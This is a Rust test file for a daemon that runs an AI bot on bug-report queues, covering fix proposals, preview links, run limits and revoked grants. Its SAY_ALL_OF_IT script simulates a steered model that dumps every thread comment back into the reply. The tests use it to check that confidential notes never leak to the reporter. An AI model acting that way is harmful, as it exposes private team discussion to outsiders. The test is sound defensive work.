    let file = git(&origin, &["show", &format!("{branch}:fix.txt")]);
    assert_eq!(file, "one\ntwo\n");

    let now =
        d.ts.store
            .report(&d.qid, &tid, Visibility::All)
            .unwrap()
            .unwrap();
    assert_eq!(now.state, State::FixProposed);
    assert_eq!(now.fixes.len(), 2);
    assert_eq!(now.fixes[0].outcome, FixOutcome::Rejected);
    assert_eq!(now.fixes[1].outcome, FixOutcome::Pending);
    let told = now.comments.iter().filter(|c| c.triage_only);
    assert!(
        told.into_iter()
            .any(|c| c.body.contains("Rounded it right."))
    );
}

/// A script that reads what its report holds and says all of it to the
/// report, as a steered model would.
const SAY_ALL_OF_IT: &str = r#"
    const t = (await clax.threads.list())[0].id;
    const all = (await clax.threads.read(t)).comments.map(c => c.text).join(" ");
    await clax.threads.reply(t, all);
    return all;
"#;

#[tokio::test]
async fn clearing_a_token_stops_new_runs_and_leaves_the_one_that_holds_it() {
    let script = r#"
        await clax.shell.exec("echo one > fix.txt");
        const seen = await clax.shell.exec("cat fix.txt");
        const p = await clax.change.propose({title: "Fix the total", summary: "Rounded it."});
        return [seen.output, p.pr];
    "#;
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Fix", script),
        Turn::finish("Proposed a fix."),
    ])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let forge = pulls_forge().await;
    d.with_link(dir.path(), &forge).await;
    let (st, q) = (d.ts.store.clone(), d.qid.clone());
    *d.late.after_command.lock().unwrap() = Some(Box::new(move || {
        st.clear_queue_repo_token(&AuditCtx::DAEMON, &q, TokenKind::Write)
            .unwrap();
    }));
    let r = d.reporter().await;
    let report = d.file(&r).await;

    let run = d.send(&report).await;
    let ended = d.ended(&run).await;
    assert_eq!(ended.status, RunStatus::Finished, "{ended:?}");
    assert_eq!(d.script_value(&run), json!(["one\n", 7]));
    assert_eq!(d.report(id_of(&report)).fixes.len(), 1);
    // Its end reaches the workspace just after the run's row.
    d.when(|| (d.late.offer(&ended, Some(&d.qid)) == Offer::default()).then_some(()))
        .await;
}

/// A workspace whose offer a test changes.
#[derive(Clone)]
struct Offered {
    inner: Arc<FakeWorkspace>,
    offer: Arc<Mutex<Offer>>,
}

#[async_trait::async_trait]
impl Workspace for Offered {
    fn offer(&self, _run: &Run, _queue: Option<&str>) -> Offer {
        self.offer.lock().unwrap().clone()
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

#[tokio::test]
async fn no_way_out_through_a_later_run_once_the_link_is_gone() {
    let note = format!(
        r#"const t = (await clax.threads.list())[0].id;
           await clax.threads.reply(t, {MARKER:?});
           return await clax.change.propose({{title: "t", summary: "s"}});"#
    );
    let turns = vec![
        Turn::script("tu_1", "Fix", &note),
        Turn::finish("Proposed."),
        Turn::script("tu_2", "Say", SAY_ALL_OF_IT),
        Turn::finish("Said."),
    ];
    let w = Offered {
        inner: Arc::default(),
        offer: Arc::new(Mutex::new(Offer::CHANGE.confidential())),
    };
    let way = way(turns, w.clone(), true).await;
    *w.offer.lock().unwrap() = Offer::default();

    let aid = way.report["artifact"]["id"].as_str().unwrap();
    let later = way.d.run_for("*owner", None, aid, &way.tid);
    let ended = way.d.ended(&later).await;
    assert!(ended.confidential);
    assert!(way.d.script_value(&later).to_string().contains(MARKER));
    let seen = way.d.read_as(&way.r, &way.tid).await.to_string();
    assert!(!seen.contains(MARKER), "{seen}");
}

#[tokio::test]
async fn no_way_out_for_a_persons_note_on_a_queue_with_no_target() {
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Say", SAY_ALL_OF_IT),
        Turn::finish("Said."),
    ])
    .await;
    d.with(FakeWorkspace::offering(Offer::default()));
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let c = clax_store::threads::NewComment {
        author_kind: clax_core::model::AUTHOR_VIEWER,
        author_name: "Sam".into(),
        author_public_id: None,
        via_session_id: None,
        body: MARKER.into(),
        via_page: false,
    };
    let (st, t) = (d.ts.store.clone(), tid.clone());
    tokio::task::spawn_blocking(move || {
        st.add_members_comment(&AuditCtx::DAEMON, &t, c).unwrap();
    })
    .await
    .unwrap();

    let run = d.send(&report).await;
    assert!(d.ended(&run).await.confidential);
    assert!(d.script_value(&run).to_string().contains(MARKER));
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains(MARKER), "{seen}");
}

#[tokio::test]
async fn a_run_sent_a_plain_thread_and_a_report_works_on_the_report_alone() {
    let d = Daemon::start(vec![
        Turn::script("tu_1", "First try", FIRST_TRY),
        Turn::finish("Proposed a fix."),
    ])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let forge = d.with_repository(dir.path());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap();
    let plain = d.ts.create_thread(aid, 1, "A plain thread", None).await;
    assert_eq!(plain.status(), 201);
    let plain: Value = plain.json().await.unwrap();
    let plain = plain.get("thread").unwrap_or(&plain);

    let res =
        d.ts.client
            .post(format!("{}/api/bot/runs", d.ts.base))
            .header("cookie", d.ts.owner_cookie())
            .json(&json!({"thread_ids": [id_of(plain), tid], "artifact_id": aid}))
            .send()
            .await
            .unwrap();
    assert_eq!(res.status(), 201);
    let v: Value = res.json().await.unwrap();
    let run = v["run"]["id"].as_str().unwrap().to_string();
    assert_eq!(d.ended(&run).await.status, RunStatus::Finished);
    let opened = forge.opened.lock().unwrap();
    assert_eq!(opened[0].head, format!("claxbot/{tid}"));
    assert!(opened[0].body.contains(&tid), "{}", opened[0].body);
    assert_eq!(d.report(&tid).fixes.len(), 1);
}

/// A report with a fix of ClaxBot's that has no preview yet, on a public
/// target: the daemon, the reporter, the report's ID, the run.
async fn held_fix() -> (Daemon, Reporter, String, Run) {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed a fix."),
    ])
    .await;
    d.with(FakeWorkspace {
        no_preview: true,
        ..FakeWorkspace::default()
    });
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let run = d.send(&report).await;
    let run = d.ended(&run).await;
    assert_eq!(run.status, RunStatus::Finished);
    (d, r, tid, run)
}

#[tokio::test]
async fn a_public_fix_waits_for_its_preview_and_then_reaches_its_reporter() {
    let (d, r, tid, run) = held_fix().await;
    let seen = d.read_as(&r, &tid).await;
    assert_eq!(seen["fixes"][0]["held"], true, "{seen}");
    let pq = format!("{}/{tid}/reopen", d.reports());
    let res = d.multipart(&r, &pq, &[("body", "Still broken")]).await;
    assert_eq!(res.status(), 409, "nothing to check yet");

    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    let url = "https://pr-2.preview.example";
    host.preview_ready(&run, &audit, url, true).await.unwrap();
    let seen = d.read_as(&r, &tid).await;
    assert_eq!(seen["fixes"][0]["verify_url"], url);
    assert_eq!(seen["fixes"][0].get("held"), None, "{seen}");
    assert!(seen.to_string().contains(PREVIEW_READY), "{seen}");
    let res = d.multipart(&r, &pq, &[("body", "Still broken")]).await;
    assert_eq!(res.status(), 200);
}

#[tokio::test]
async fn a_wait_that_ends_with_no_preview_tells_the_members_once_and_the_reporter_nothing() {
    let (d, r, tid, run) = held_fix().await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    for _ in 0..2 {
        host.preview_missed(&run, &audit).await.unwrap();
    }
    let notes = d.report(&tid).comments;
    let told = notes
        .iter()
        .filter(|c| c.triage_only && c.body == PREVIEW_MISSED)
        .count();
    assert_eq!(told, 1, "{notes:?}");
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains(PREVIEW_MISSED), "{seen}");

    // It says nothing of a fix that has its link.
    let (d, _, tid, run) = held_fix().await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    host.preview_ready(&run, &audit, "https://pr-3.preview.example", true)
        .await
        .unwrap();
    host.preview_missed(&run, &audit).await.unwrap();
    assert!(
        d.report(&tid)
            .comments
            .iter()
            .all(|c| c.body != PREVIEW_MISSED)
    );
}

#[tokio::test]
async fn a_missed_preview_says_what_deploys_one_where_the_target_says() {
    let sha = "1".repeat(40);
    let fake = || FakeWorkspace {
        no_preview: true,
        commit: Some(sha.clone()),
        offered: Some(Offer {
            preview_gate: Some("post `/go {commit}` on the pull request".into()),
            ..Offer::CHANGE
        }),
        ..FakeWorkspace::default()
    };
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed a fix."),
    ])
    .await;
    d.with(fake());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let run = d.send(&report).await;
    let run = d.ended(&run).await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone())
        .with_workspace(std::sync::Arc::new(fake()));
    let audit = clax_bot::run::bot_ctx(&run.person);
    host.preview_missed(&run, &audit).await.unwrap();
    let step = format!("post `/go {sha}` on the pull request");
    let kept = d.ts.store.fix_links(&tid, 1).unwrap().unwrap().preview_step;
    assert_eq!(kept, Some(format!("To deploy its preview, {step}.")));
    let notes = d.report(&tid).comments;
    let told: Vec<_> = notes.iter().filter(|c| c.body.contains(&step)).collect();
    // The held fix's note, and the word that the wait ended.
    assert_eq!(told.len(), 2, "{notes:?}");
    assert!(told.iter().all(|c| c.triage_only), "{notes:?}");
    assert!(
        told[1]
            .body
            .starts_with("ClaxBot stopped watching for this fix's preview without seeing it up")
    );
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains("/go"), "{seen}");
}

#[tokio::test]
async fn a_preview_of_one_runs_fix_does_not_land_on_the_next_runs() {
    let (d, r, _, tid) = fixed(
        Offer::CHANGE,
        vec![
            Turn::script("tu_2", "Fix again", PROPOSE),
            Turn::finish("Proposed it again."),
        ],
    )
    .await;
    let first = d.nth_run_ended(&tid, 0).await;
    d.reopen(&r, &tid, "Still broken").await;
    d.nth_run_ended(&tid, 1).await;
    assert_eq!(d.report(&tid).fixes.len(), 2);

    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&first.person);
    let url = "https://pr-9.preview.example";
    host.preview_ready(&first, &audit, url, true).await.unwrap();
    let now = d.report(&tid);
    assert_ne!(now.fixes[1].fix.verify_url.as_deref(), Some(url));
    assert!(now.comments.iter().all(|c| !c.body.contains(url)));
}

/// What the queue's owner reads of report `tid` through its route.
async fn as_member(d: &Daemon, tid: &str) -> Value {
    let path = format!("/api/queues/{}/reports/{tid}", d.qid);
    let (status, text) = d.read_with(Some(&d.ts.owner_cookie()), &path).await;
    assert_eq!(status, 200, "{text}");
    let v: Value = serde_json::from_str(&text).unwrap();
    v["report"].clone()
}

/// The owner hands report `tid`'s held fix over with `body`: the answer.
async fn hand_over(d: &Daemon, tid: &str, body: Value) -> (u16, Value) {
    let path = format!("/api/queues/{}/reports/{tid}/fix", d.qid);
    let res =
        d.ts.client
            .post(format!("{}{path}", d.ts.base))
            .header("cookie", d.ts.owner_cookie())
            .json(&body)
            .send()
            .await
            .unwrap();
    let status = res.status().as_u16();
    (status, res.json().await.unwrap())
}

const CHECK_IT: &str = "https://check.example/pr-1";

#[tokio::test]
async fn a_held_fixs_preview_is_kept_for_its_members_and_never_reaches_its_reporter() {
    let (d, r, tid, run) = held_fix().await;
    let member = as_member(&d, &tid).await;
    assert_eq!(member["fixes"][0]["preview_url"], Value::Null, "{member}");
    assert!(member["fixes"][0].get("preview_url").is_some(), "{member}");

    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    let url = "https://pr-2.preview.example";
    for _ in 0..2 {
        host.preview_ready(&run, &audit, url, false).await.unwrap();
    }
    let member = as_member(&d, &tid).await;
    assert_eq!(member["fixes"][0]["preview_url"], url, "{member}");
    assert_eq!(member["fixes"][0]["held"], true, "{member}");
    assert_eq!(member["fixes"][0]["preview_missed"], false, "{member}");
    let notes = d.report(&tid).comments;
    let told = notes.iter().filter(|c| c.body.contains(url)).count();
    assert_eq!(told, 1, "{notes:?}");

    let seen = d.read_as(&r, &tid).await;
    assert!(!seen.to_string().contains("preview.example"), "{seen}");
    assert!(seen["fixes"][0].get("preview_url").is_none(), "{seen}");
    assert!(seen["fixes"][0].get("preview_missed").is_none(), "{seen}");
    assert_eq!(seen["fixes"][0]["held"], true, "{seen}");

    // Having answered, it is not said to have been missed.
    host.preview_missed(&run, &audit).await.unwrap();
    assert_eq!(
        as_member(&d, &tid).await["fixes"][0]["preview_missed"],
        false
    );
}

#[tokio::test]
async fn a_preview_a_fix_was_proposed_with_is_kept_for_its_members_alone() {
    let (d, r, _, tid) = fixed(Offer::CHANGE.confidential(), vec![]).await;
    let member = as_member(&d, &tid).await;
    let fix = &member["fixes"][0];
    assert_eq!(fix["preview_url"], "https://pr-1.preview.example", "{fix}");
    assert_eq!(fix["held"], true, "{fix}");
    assert!(fix.get("verify_url").is_none_or(Value::is_null), "{fix}");
    let seen = d.read_as(&r, &tid).await;
    assert!(!seen.to_string().contains("preview.example"), "{seen}");
}

#[tokio::test]
async fn a_wait_that_ended_shows_on_the_fix_for_its_members_alone() {
    let (d, r, tid, run) = held_fix().await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    assert_eq!(
        as_member(&d, &tid).await["fixes"][0]["preview_missed"],
        false
    );
    host.preview_missed(&run, &audit).await.unwrap();
    let member = as_member(&d, &tid).await;
    assert_eq!(member["fixes"][0]["preview_missed"], true, "{member}");
    assert_eq!(member["fixes"][0]["preview_url"], Value::Null, "{member}");
    let seen = d.read_as(&r, &tid).await;
    assert!(seen["fixes"][0].get("preview_missed").is_none(), "{seen}");

    // A preview that answers after all ends that.
    host.preview_ready(&run, &audit, "https://pr-2.preview.example", false)
        .await
        .unwrap();
    assert_eq!(
        as_member(&d, &tid).await["fixes"][0]["preview_missed"],
        false
    );
}

#[tokio::test]
async fn a_person_may_not_hand_over_a_held_fix_with_no_link() {
    let (d, _, tid, _) = held_fix().await;
    let (status, v) = hand_over(&d, &tid, json!({"summary": "Have a look."})).await;
    assert_eq!(status, 400, "{v}");
    assert_eq!(v["error"]["code"], "verify_url_required", "{v}");
    let now = d.report(&tid);
    assert_eq!(now.fixes.len(), 1, "nothing changed");
    assert!(now.fixes[0].held);
    assert_eq!(now.fixes[0].outcome, FixOutcome::Pending);

    let body = json!({"summary": "Have a look.", "verify_url": CHECK_IT});
    let (status, v) = hand_over(&d, &tid, body).await;
    assert_eq!(status, 200, "{v}");
    let now = d.report(&tid);
    assert_eq!(now.fixes[0].outcome, FixOutcome::Superseded);
    assert_eq!(now.fixes[1].proposer_kind, ProposerKind::Person);
    assert!(!now.fixes[1].held);
}

#[tokio::test]
async fn a_person_may_still_propose_a_fix_with_no_link_when_none_is_held() {
    let d = Daemon::start(vec![]).await;
    d.with(FakeWorkspace::default());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let (status, v) = hand_over(&d, id_of(&report), json!({"summary": "Done."})).await;
    assert_eq!(status, 200, "{v}");
}

/// A held fix of ClaxBot's handed over with a link: the daemon, the reporter
/// and the report's ID. `turns` come after the first run's.
async fn handed_over(turns: Vec<Turn>) -> (Daemon, Reporter, String) {
    let mut all = vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed a fix."),
    ];
    all.extend(turns);
    let d = Daemon::start(all).await;
    d.with(FakeWorkspace::offering(Offer::CHANGE.confidential()));
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let first = d.send(&report).await;
    assert_eq!(d.ended(&first).await.status, RunStatus::Finished);
    assert!(d.report(&tid).fixes[0].held);
    let body = json!({"summary": "Have a look.", "verify_url": CHECK_IT});
    let (status, v) = hand_over(&d, &tid, body).await;
    assert_eq!(status, 200, "{v}");
    (d, r, tid)
}

#[tokio::test]
async fn still_broken_on_a_fix_a_person_handed_over_wakes_claxbot() {
    let (d, r, tid) = handed_over(vec![
        Turn::script("tu_2", "Fix again", PROPOSE),
        Turn::finish("Proposed it again."),
    ])
    .await;
    d.reopen(&r, &tid, "It is still broken on the total").await;
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.status, RunStatus::Finished);
    assert_eq!(second.woken_by, Some(WokenBy::Reopen));
    assert!(second.confidential);
    let asked = d.fake.requests()[2].to_string();
    assert!(asked.contains("It is still broken on the total"), "{asked}");
    assert_eq!(d.report(&tid).fixes.len(), 3);
}

#[tokio::test]
async fn a_persons_stop_holds_on_a_fix_a_person_handed_over() {
    let (d, r, tid) = handed_over(vec![]).await;
    let aid = d.report(&tid).artifact.id.clone();
    let stopped = d.run_held("*owner", None, &aid, &tid);
    d.ts.store.cancel_run(&AuditCtx::DAEMON, &stopped).unwrap();
    d.driver.wake(&stopped);
    d.ended(&stopped).await;
    d.reopen(&r, &tid, "Still broken").await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 2);
}

#[tokio::test]
async fn a_late_preview_leaves_the_link_a_person_handed_over_alone() {
    let (d, r, tid) = handed_over(vec![]).await;
    let run = d.nth_run_ended(&tid, 0).await;
    let host = clax_server::bot::ServerHost::new(d.ts.state.clone());
    let audit = clax_bot::run::bot_ctx(&run.person);
    let late = "https://pr-1.preview.example";
    host.preview_ready(&run, &audit, late, true).await.unwrap();
    host.preview_ready(&run, &audit, late, false).await.unwrap();
    host.preview_missed(&run, &audit).await.unwrap();
    let now = d.report(&tid);
    assert_eq!(now.fixes[1].fix.verify_url.as_deref(), Some(CHECK_IT));
    let member = as_member(&d, &tid).await;
    assert_ne!(member["fixes"][1]["preview_missed"], true, "{member}");
    let seen = d.read_as(&r, &tid).await;
    assert!(!seen.to_string().contains(late), "{seen}");
}

#[tokio::test]
async fn a_persons_note_written_during_a_step_waits_for_the_next_tick() {
    let code = r#"await clax.shell.exec("ls");
        const t = (await clax.threads.list())[0].id;
        const all = (await clax.threads.read(t)).comments.map(c => c.text).join(" ");
        await clax.threads.reply(t, all);
        return all;"#;
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Say", code),
        Turn::script("tu_2", "Say again", SAY_ALL_OF_IT),
        Turn::finish("Said."),
    ])
    .await;
    d.with(FakeWorkspace::offering(Offer::CHANGE));
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let (st, t) = (d.ts.store.clone(), tid.clone());
    *d.late.after_command.lock().unwrap() = Some(Box::new(move || {
        let c = clax_store::threads::NewComment {
            author_kind: clax_core::model::AUTHOR_VIEWER,
            author_name: "Sam".into(),
            author_public_id: None,
            via_session_id: None,
            body: MARKER.into(),
            via_page: false,
        };
        st.add_members_comment(&AuditCtx::DAEMON, &t, c).unwrap();
    }));
    let run = d.send(&report).await;
    let ended = d.ended(&run).await;
    assert!(ended.confidential, "the next tick found the note");
    assert!(
        !d.script_value(&run).to_string().contains(MARKER),
        "the step that began without it read none of it"
    );
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains(MARKER), "{seen}");
}

const PROPOSE: &str = r#"return await clax.change.propose({title: "t", summary: "s"});"#;

const TRY_PROPOSE: &str = r#"try { return await clax.change.propose({title: "t", summary: "s"}); }
    catch (e) { return e.code; }"#;

/// A daemon with a report on `offer`'s target and a fix of ClaxBot's on it:
/// the daemon, the reporter, the report and its ID. `turns` come after the
/// first run's.
async fn fixed(offer: Offer, turns: Vec<Turn>) -> (Daemon, Reporter, Value, String) {
    let mut all = vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed a fix."),
    ];
    all.extend(turns);
    let d = Daemon::start(all).await;
    d.with(FakeWorkspace::offering(offer));
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let first = d.send(&report).await;
    assert_eq!(d.ended(&first).await.status, RunStatus::Finished);
    (d, r, report, tid)
}

#[tokio::test]
async fn a_plain_reply_wakes_claxbot_only_on_a_target_that_opts_in_and_is_answered_all_the_same() {
    let (d, r, _, tid) = fixed(Offer::CHANGE, vec![]).await;
    d.reply(&r, &tid, "Does it cover refunds?").await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
    let last = d.report(&tid).comments.last().unwrap().body.clone();
    assert_eq!(last, REPLY_RECEIVED);
}

#[tokio::test]
async fn a_reply_run_on_a_target_that_opts_in_answers_and_leaves_the_fix_waiting() {
    let (d, r, _, tid) = fixed(
        Offer::CHANGE.wake_on_reply(),
        vec![
            Turn::script("tu_2", "Answer", TRY_PROPOSE),
            Turn::finish("Answered."),
        ],
    )
    .await;
    d.reply(&r, &tid, "Does it cover refunds?").await;
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.woken_by, Some(WokenBy::Reply));
    assert_eq!(d.script_value(&second.id), json!("shell_disabled"));
    assert!(
        d.fake.requests()[2]
            .to_string()
            .contains("Does it cover refunds?")
    );
    let now = d.report(&tid);
    assert_eq!(now.fixes.len(), 1, "{:?}", now.fixes);
    assert_eq!(now.state, State::FixProposed);
}

/// What a run says of its fix after proposing, and a script that says it.
const SAID_AFTER: &str = "SAID-AFTER https://forge.example/pr/1";
const SAY_AFTER: &str = r#"const [t] = await clax.threads.list();
    return await clax.threads.reply(t.id, "SAID-AFTER https://forge.example/pr/1");"#;

#[tokio::test]
async fn a_reply_after_a_proposal_reaches_the_queues_people_and_no_reporter() {
    let (d, r, _, tid) = fixed(
        Offer::CHANGE,
        vec![
            Turn::script("tu_2", "Tell", SAY_AFTER),
            Turn::finish("Done."),
        ],
    )
    .await;
    let aid = d.report(&tid).artifact.id;
    let second = d.run_for("*owner", None, &aid, &tid);
    assert_eq!(d.ended(&second).await.status, RunStatus::Finished);
    assert_eq!(d.script_value(&second)["members_only"], true);
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains(SAID_AFTER), "{seen}");
    let notes = d.report(&tid).comments;
    assert!(
        notes.iter().any(|c| c.triage_only && c.body == SAID_AFTER),
        "{notes:?}"
    );
}

#[tokio::test]
async fn a_reply_to_a_held_fix_is_acknowledged_and_its_runs_answer_stays_with_the_queue() {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed a fix."),
        Turn::script("tu_2", "Answer", SAY_AFTER),
        Turn::finish("Answered."),
    ])
    .await;
    d.with(FakeWorkspace {
        no_preview: true,
        ..FakeWorkspace::offering(Offer::CHANGE.wake_on_reply())
    });
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let first = d.send(&report).await;
    assert_eq!(d.ended(&first).await.status, RunStatus::Finished);
    d.reply(&r, &tid, "Does it cover refunds?").await;
    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.woken_by, Some(WokenBy::Reply));
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(seen.contains(REPLY_RECEIVED), "{seen}");
    assert!(!seen.contains(SAID_AFTER), "{seen}");
}

#[tokio::test]
async fn automatic_runs_stop_at_three_tell_the_members_and_a_person_starts_them_again() {
    let again = |i: &str| {
        vec![
            Turn::script(i, "Fix", PROPOSE),
            Turn::finish("Proposed again."),
        ]
    };
    let turns = [again("t2"), again("t3"), again("t4"), again("t5")].concat();
    let (d, r, _, tid) = fixed(Offer::CHANGE, turns).await;
    for n in 1..=3 {
        d.reopen(&r, &tid, "Still broken").await;
        let run = d.nth_run_ended(&tid, n).await;
        assert_eq!(run.woken_by, Some(WokenBy::Reopen));
        assert_eq!(run.status, RunStatus::Finished);
    }
    d.reopen(&r, &tid, "Still broken").await;
    let stopped = |d: &Daemon| {
        d.report(&tid)
            .comments
            .iter()
            .filter(|c| c.triage_only && c.body == AUTO_RUNS_STOPPED)
            .count()
    };
    d.when(|| (stopped(&d) > 0).then_some(())).await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(stopped(&d), 1, "the notice is given once");
    let seen = d.read_as(&r, &tid).await.to_string();
    assert!(!seen.contains(AUTO_RUNS_STOPPED), "{seen}");
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 4);

    // A person's word starts the count again.
    let by = clax_store::queues::ReportWriter::Person {
        name: "Sam".into(),
        public_id: None,
    };
    d.ts.store
        .report_reply(&AuditCtx::DAEMON, &d.qid, &tid, &by, "Try once more.")
        .unwrap();
    let made = d.follow(&tid).await.expect("the count starts again");
    assert_eq!(d.ended(&made).await.status, RunStatus::Finished);
}

#[tokio::test]
async fn a_persons_stop_stays_stopped_whatever_the_reporter_says() {
    let (d, r, report, tid) = fixed(Offer::CHANGE, vec![]).await;
    // The owner's next run is stopped before it does anything.
    let aid = report["artifact"]["id"].as_str().unwrap();
    let held = d.run_held("*owner", None, aid, &tid);
    d.ts.store.cancel_run(&AuditCtx::DAEMON, &held).unwrap();
    d.driver.wake(&held);
    let run = d.ended(&held).await;
    assert_eq!(run.reason.as_deref(), Some("cancelled"));
    d.reopen(&r, &tid, "Still broken").await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 2);
}

#[tokio::test]
async fn a_refused_person_starts_nothing_and_adds_no_refusal_to_the_audit_trail() {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed."),
    ])
    .await;
    d.with(FakeWorkspace::default());
    let (_, pat) = person(&d, "Pat", true).await;
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap();
    let run = d.run_for(&pat, None, aid, &tid);
    assert_eq!(d.ended(&run).await.status, RunStatus::Finished);
    let (st, p) = (d.ts.store.clone(), pat.clone());
    tokio::task::spawn_blocking(move || {
        st.set_flags(&AuditCtx::DAEMON, &p, &[(Flag::Claxbot, false)])
            .unwrap();
    })
    .await
    .unwrap();
    d.reopen(&r, &tid, "Still broken").await;
    for _ in 0..3 {
        assert_eq!(d.follow(&tid).await, None);
    }
    let refused =
        d.ts.store
            .events_after(0, 10_000)
            .unwrap()
            .into_iter()
            .filter(|e| e.kind == "bot.refused")
            .count();
    assert_eq!(refused, 0);
}

#[tokio::test]
async fn a_further_run_acts_for_the_person_and_agent_of_the_run_that_proposed() {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed."),
        Turn::finish("Looked."),
        Turn::finish("Looked again."),
    ])
    .await;
    d.with(FakeWorkspace::default());
    let (c, pat) = person(&d, "Pat", true).await;
    let grant = c.grant_id();
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap();
    let fixer = d.run_for(&pat, Some(&grant), aid, &tid);
    assert_eq!(d.ended(&fixer).await.status, RunStatus::Finished);
    // The owner's look at it is the newest run, and proposed nothing.
    let look = d.run_for("*owner", None, aid, &tid);
    d.ended(&look).await;

    d.reopen(&r, &tid, "Still broken").await;
    let third = d.nth_run_ended(&tid, 2).await;
    assert_eq!(third.person, pat);
    assert_eq!(third.agent_grant.as_deref(), Some(grant.as_str()));
}

#[tokio::test]
async fn a_revoked_grant_starts_nothing() {
    let d = Daemon::start(vec![
        Turn::script("tu_fix", "Fix", PROPOSE),
        Turn::finish("Proposed."),
    ])
    .await;
    d.with(FakeWorkspace::default());
    let (c, pat) = person(&d, "Pat", true).await;
    let grant = c.grant_id();
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();
    let aid = report["artifact"]["id"].as_str().unwrap();
    let fixer = d.run_for(&pat, Some(&grant), aid, &tid);
    assert_eq!(d.ended(&fixer).await.status, RunStatus::Finished);
    let st = d.ts.store.clone();
    tokio::task::spawn_blocking(move || {
        let by = clax_store::people::EndedBy::Owner;
        st.revoke_grant(&AuditCtx::DAEMON, &grant, by).unwrap();
    })
    .await
    .unwrap();
    d.reopen(&r, &tid, "Still broken").await;
    assert_eq!(d.follow(&tid).await, None);
    assert_eq!(d.ts.store.runs_for_thread(&tid, 10).unwrap().len(), 1);
}

#[tokio::test]
async fn a_live_claim_by_another_agent_holds_a_reopen_back() {
    let (d, _, _, tid) = fixed(Offer::CHANGE, vec![Turn::finish("Looked at it again.")]).await;
    let st = d.ts.store.clone();
    let (q, t) = (d.qid.clone(), tid.clone());
    // Straight to the store: no event, so nothing races the claim.
    tokio::task::spawn_blocking({
        let (st, q, t) = (st.clone(), q.clone(), t.clone());
        move || {
            st.reopen_report(
                &AuditCtx::DAEMON,
                &q,
                &t,
                clax_store::queues::Verdict::Reporter("emp-1"),
                "Still broken".to_string(),
                None,
                None,
                None,
            )
            .unwrap();
        }
    })
    .await
    .unwrap();
    let sid = d.ts.register_session("claude", "someone").await["id"]
        .as_str()
        .unwrap()
        .to_string();
    d.ts.store.claim(&AuditCtx::DAEMON, &q, &t, &sid).unwrap();
    assert_eq!(d.follow(&tid).await, None);
    d.ts.store.release(&AuditCtx::DAEMON, &q, &t, &sid).unwrap();
    let made = d.follow(&tid).await.expect("the claim is over");
    d.ended(&made).await;
}

